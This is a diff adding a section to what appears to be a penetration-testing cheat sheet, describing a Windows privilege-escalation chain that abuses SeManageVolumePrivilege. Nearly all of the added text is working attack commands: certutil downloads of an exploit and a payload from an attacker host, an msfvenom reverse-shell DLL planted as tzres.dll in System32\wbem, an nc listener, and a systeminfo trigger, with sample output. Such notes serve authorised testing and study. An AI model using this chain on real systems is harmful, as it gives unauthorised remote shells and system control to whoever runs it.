@@ -572,6 +572,47 @@ Run a process as another user if you know valid local or admin creds.
 runas.exe /user:<USER> cmd
 ```
 
+## SeManageVolumeExploit DLL Hijack
+
+#Shell #Windows #PrivilegeEscalation
+Use `SeManageVolumeExploit` when the current Windows token has `SeManageVolumePrivilege`, then abuse the writable `C:\` permissions to place a DLL payload in `System32\wbem` and trigger it with `systeminfo`.
+
+```cmd
+# Attacker: download the exploit first.
+# https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
+
+# Target: transfer exploit to victim.
+certutil -urlcache -split -f "http://<LHOST>/SeManageVolumeExploit.exe" SeManageVolumeExploit.exe
+
+# Target: run exploit.
+SeManageVolumeExploit.exe
+# Example output:
+# Entries changed: 925
+# DONE
+
+# Target: check the permission change.
+icacls C:\
+# Example output:
+# BUILTIN\Users:(OI)(CI)(F)
+
+# Attacker: create reverse-shell DLL payload.
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll
+
+# Target: place payload as tzres.dll in the System32 wbem directory.
+certutil -urlcache -split -f "http://<LHOST>/shell.dll" "C:\Windows\System32\wbem\tzres.dll"
+
+# Attacker: start listener before triggering.
+nc -lvnp <LPORT>
+
+# Target: trigger DLL load.
+systeminfo
+
+# Attacker shell: confirm callback context.
+whoami
+# Example output:
+# nt authority\network service
+```
+
 ## UAC Bypass
 
 #Shell #Windows #PrivilegeEscalation
